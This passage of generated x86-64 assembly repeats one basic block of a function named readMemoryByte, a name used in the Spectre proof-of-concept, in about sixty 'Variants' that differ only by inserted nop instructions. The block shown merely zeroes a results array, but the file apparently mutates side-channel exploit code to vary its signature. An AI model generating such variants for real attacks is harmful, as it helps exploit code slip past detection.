## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 51
.LreadMemoryByte_win9_var51:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 52
.LreadMemoryByte_win9_var52:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 53
.LreadMemoryByte_win9_var53:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 54
.LreadMemoryByte_win9_var54:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 55
.LreadMemoryByte_win9_var55:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 56
.LreadMemoryByte_win9_var56:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 57
.LreadMemoryByte_win9_var57:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 58
.LreadMemoryByte_win9_var58:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 59
.LreadMemoryByte_win9_var59:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 60
.LreadMemoryByte_win9_var60:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 61
.LreadMemoryByte_win9_var61:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 62
.LreadMemoryByte_win9_var62:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 63
.LreadMemoryByte_win9_var63:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 64
.LreadMemoryByte_win9_var64:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 65
.LreadMemoryByte_win9_var65:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 66
.LreadMemoryByte_win9_var66:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 67
.LreadMemoryByte_win9_var67:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 68
.LreadMemoryByte_win9_var68:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 69
.LreadMemoryByte_win9_var69:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 70
.LreadMemoryByte_win9_var70:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 71
.LreadMemoryByte_win9_var71:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 72
.LreadMemoryByte_win9_var72:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 73
.LreadMemoryByte_win9_var73:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 74
.LreadMemoryByte_win9_var74:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 75
.LreadMemoryByte_win9_var75:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 76
.LreadMemoryByte_win9_var76:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 77
.LreadMemoryByte_win9_var77:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 78
.LreadMemoryByte_win9_var78:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 79
.LreadMemoryByte_win9_var79:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 80
.LreadMemoryByte_win9_var80:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 81
.LreadMemoryByte_win9_var81:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
	nop
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 82
.LreadMemoryByte_win9_var82:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 83
.LreadMemoryByte_win9_var83:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 84
.LreadMemoryByte_win9_var84:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 85
.LreadMemoryByte_win9_var85:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 86
.LreadMemoryByte_win9_var86:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 87
.LreadMemoryByte_win9_var87:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 88
.LreadMemoryByte_win9_var88:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 89
.LreadMemoryByte_win9_var89:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 90
.LreadMemoryByte_win9_var90:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 91
.LreadMemoryByte_win9_var91:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 92
.LreadMemoryByte_win9_var92:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 93
.LreadMemoryByte_win9_var93:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 94
.LreadMemoryByte_win9_var94:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 95
.LreadMemoryByte_win9_var95:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 96
.LreadMemoryByte_win9_var96:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 97
.LreadMemoryByte_win9_var97:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 98
.LreadMemoryByte_win9_var98:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 99
.LreadMemoryByte_win9_var99:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 100
.LreadMemoryByte_win9_var100:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 101
.LreadMemoryByte_win9_var101:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 102
.LreadMemoryByte_win9_var102:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 103
.LreadMemoryByte_win9_var103:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 104
.LreadMemoryByte_win9_var104:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 105
.LreadMemoryByte_win9_var105:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 106
.LreadMemoryByte_win9_var106:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 107
.LreadMemoryByte_win9_var107:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 108
.LreadMemoryByte_win9_var108:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 109
.LreadMemoryByte_win9_var109:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 110
.LreadMemoryByte_win9_var110:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 111
.LreadMemoryByte_win9_var111:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 112
.LreadMemoryByte_win9_var112:
	popq	%rax
